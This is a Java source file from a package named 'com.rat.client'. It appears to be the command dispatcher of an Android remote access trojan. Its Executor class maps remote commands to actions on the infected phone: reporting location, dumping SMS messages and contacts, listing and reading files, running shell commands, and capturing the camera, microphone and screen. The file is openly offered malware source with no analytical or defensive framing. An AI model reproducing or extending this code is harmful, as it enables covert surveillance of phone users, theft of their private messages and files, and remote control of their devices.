package com.rat.client;

import android.content.Context;

public class Executor {
    public static String run(Context ctx, String cmd) {
        String[] p = cmd.split(":", 2);
        try {
            switch (p[0]) {
                case "loc": return Location.get(ctx);
                case "sms": return Sms.dump(ctx);
                case "contacts": return Contacts.dump(ctx);
                case "file_list": return Files.list(p[1]);
                case "file_get": return Files.read(p[1]);
                case "shell": return Shell.exec(p[1]);
                case "cam": return Camera.capture(ctx, p[1]);
                case "mic": return Mic.record(ctx, Integer.parseInt(p[1]));
                case "screen": return Screen.capture(ctx);
                default: return "unknown";
            }
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }
}
